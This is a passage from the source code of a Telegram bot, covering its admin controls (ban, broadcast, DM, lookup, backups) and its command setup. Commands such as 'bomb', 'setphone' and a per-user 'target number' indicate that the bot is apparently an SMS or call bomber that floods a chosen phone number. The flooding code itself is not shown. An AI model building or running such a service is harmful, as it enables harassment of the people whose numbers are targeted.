                await update.message.reply_text("Invalid user ID.")
                context.user_data.pop('dm_mode')
        elif context.user_data['dm_mode'] == 'await_message':
            target = context.user_data['dm_target']
            if update.message.reply_to_message:
                try:
                    await update.message.reply_to_message.copy(chat_id=target)
                    await update.message.reply_text(f"✅ Message sent to {target}.")
                except Exception as e:
                    await update.message.reply_text(f"❌ Failed: {e}")
            else:
                text = update.message.text
                try:
                    await context.bot.send_message(chat_id=target, text=text)
                    await update.message.reply_text(f"✅ Message sent to {target}.")
                except Exception as e:
                    await update.message.reply_text(f"❌ Failed: {e}")
            context.user_data.pop('dm_mode')
            context.user_data.pop('dm_target')
        return

    # Other admin actions
    if 'add_admin' in context.user_data:
        try:
            uid = int(update.message.text)
            set_admin_role(uid, True)
            await update.message.reply_text(f"User {uid} is now admin.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('add_admin')
    elif 'remove_admin' in context.user_data:
        try:
            uid = int(update.message.text)
            set_admin_role(uid, False)
            await update.message.reply_text(f"User {uid} is no longer admin.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('remove_admin')
    elif 'lookup_user' in context.user_data:
        try:
            uid = int(update.message.text)
            user = get_user_by_id(uid)
            if user:
                target = get_user_target(uid) or "None"
                text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}"
                await update.message.reply_text(text)
            else:
                await update.message.reply_text("User not found.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('lookup_user')
    elif 'ban_user' in context.user_data:
        try:
            uid = int(update.message.text)
            if ban_user(uid):
                await update.message.reply_text(f"User {uid} banned.")
            else:
                await update.message.reply_text("User not found.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('ban_user')
    elif 'unban_user' in context.user_data:
        try:
            uid = int(update.message.text)
            if unban_user(uid):
                await update.message.reply_text(f"User {uid} unbanned.")
            else:
                await update.message.reply_text("User not found or not banned.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('unban_user')
    elif 'delete_user' in context.user_data:
        try:
            uid = int(update.message.text)
            if delete_user(uid):
                await update.message.reply_text(f"User {uid} deleted.")
            else:
                await update.message.reply_text("User not found.")
        except:
            await update.message.reply_text("Invalid user ID.")
        context.user_data.pop('delete_user')
    else:
        pass

# ------------------------------------------------------------------
# Error Handler
# ------------------------------------------------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# ------------------------------------------------------------------
# Main Webhook Setup
# ------------------------------------------------------------------
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("bom", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("speedup", speedup))
    app.add_handler(CommandHandler("speeddown", speeddown))
    app.add_handler(CommandHandler("setphone", setphone))
    app.add_handler(CommandHandler("menu", menu))

    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("deleteuser", delete_user_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("dm", dm))
    app.add_handler(CommandHandler("bulkdm", bulk_dm))
    app.add_handler(CommandHandler("listusers", list_users))
    app.add_handler(CommandHandler("recent", recent_users))
    app.add_handler(CommandHandler("lookup", user_lookup))
    app.add_handler(CommandHandler("backup", backup))
    app.add_handler(CommandHandler("fullbackup", full_backup))
    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("apicount", api_count))
    app.add_handler(CommandHandler("apilist", api_list))

    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, handle_admin_input), group=1)
    app.add_error_handler(error_handler)

    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Starting webhook on {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("No WEBHOOK_URL set. Exiting.")
        exit(1)

if __name__ == "__main__":
    main()
